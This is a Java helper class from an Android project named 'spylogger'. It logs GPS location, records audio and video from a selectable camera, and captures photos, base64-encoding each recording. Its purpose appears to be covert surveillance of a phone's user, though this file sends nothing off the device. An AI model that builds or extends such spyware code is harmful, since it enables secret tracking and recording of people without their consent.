package com.gravatasufoca.spylogger.helpers;

import android.content.Context;
import android.util.Log;

import com.gravatasufoca.spylogger.services.GPSTracker;
import com.gravatasufoca.spylogger.utils.Utils;

import java.io.IOException;

/**
 * Created by bruno on 19/11/16.
 */

public class ServicosHelper{

    public void getLocation(Context context){
        GPSTracker gpsTracker=new GPSTracker(context);
        if(gpsTracker.canGetLocation()) {
            try {
                Thread.sleep(5000);
                Log.i("GPS LOCATION", Double.toString(gpsTracker.getLatitude())+","+Double.toString(gpsTracker.getLongitude()));
                Log.i("GPS LOCATION", Double.toString(gpsTracker.getAccuracy()));
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }

    public void getAudio(Context context,int maxLength){
        try {
            final MediaRecorderHelper mediaRecorderHelper=new MediaRecorderHelper(context, MediaRecorderHelper.TipoRecordedMidia.AUDIO);
            TaskComplete callback=new TaskComplete() {
                @Override
                public void onFinish(Object object) {
                    String audio= Utils.encodeBase64(mediaRecorderHelper.getRecordedFile());
                    audio.length();
                }
            };
            mediaRecorderHelper.setMaxDuration(maxLength);
            mediaRecorderHelper.setCallback(callback);
            mediaRecorderHelper.setLigacao(false);
            mediaRecorderHelper.start();

        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public void getVideo(Context context,int maxLength,boolean frontCamera){
        try {
            final MediaRecorderHelper mediaRecorderHelper=new MediaRecorderHelper(context, MediaRecorderHelper.TipoRecordedMidia.VIDEO);
            TaskComplete callback=new TaskComplete() {
                @Override
                public void onFinish(Object object) {
                    String audio= Utils.encodeBase64(mediaRecorderHelper.getRecordedFile());
                    audio.length();
                }
            };
            mediaRecorderHelper.setMaxDuration(maxLength);
            mediaRecorderHelper.setCallback(callback);
            mediaRecorderHelper.setFrontCamera(frontCamera);
            mediaRecorderHelper.start();

        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public void getPicture(Context context,boolean frontCamera){
        try {
            final MediaRecorderHelper mediaRecorderHelper=new MediaRecorderHelper(context, MediaRecorderHelper.TipoRecordedMidia.IMAGE);
            TaskComplete callback=new TaskComplete() {
                @Override
                public void onFinish(Object object) {
                    byte[] data= (byte[]) object;
                    String audio= Utils.encodeBase64(data);
                    audio.length();
                }
            };
            mediaRecorderHelper.setCallback(callback);
            mediaRecorderHelper.setFrontCamera(frontCamera);
            mediaRecorderHelper.takePicture();

        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
